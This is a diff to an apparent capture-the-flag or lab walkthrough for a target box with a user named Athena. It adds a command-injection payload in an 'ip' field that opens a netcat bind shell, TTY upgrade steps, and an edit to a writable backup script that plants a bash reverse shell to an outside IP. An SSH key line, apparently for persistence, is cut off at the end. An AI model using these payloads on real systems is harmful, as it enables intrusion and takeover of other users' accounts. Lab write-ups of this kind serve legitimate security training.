@@ -200,6 +200,8 @@ Instead of making the target connect to me (`reverse shell`) I set up a listener
 ```HTTP
 ip=127.0.0.1+-c1$(nc+-lp+4445+-e+/bin/bash)
 ```
+This basically says "listen on this port and execute this command (/bin/bash) when someone connects".
+
 
 And I connect with:
 ```bash
@@ -207,9 +209,26 @@ nc 10.82.184.5 4445
 ```
 ![temp](assets/20260720111715.png)
 
+Upgrade to a fully interactive TTY shell:
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+ctrl + z
+stty raw --echo; fg
+export TERM=xterm
+```
+
 ```bash
 find / -not -path "/var/www/html*" -not -path "/proc*" -not -path "/snap*" -writable 2>/dev/null
 ```
+
+I find that I can edit the file `/usr/share/backup/backup.sh` which is owned by user Athena. It is her backup script.
+
+I edit the script and enter the line:
+```bash
+bash -c "bash -i >& /dev/tcp/192.168.135.169/1338 0>&1"
+```
+
+Set up a listener, and after a little while I get a shell as Athena!
 
 ```bash
 echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMa3SFT8EO51dS0QWDeuLzilfrmsB7g0zXPFFRB3TXAf kali@kali
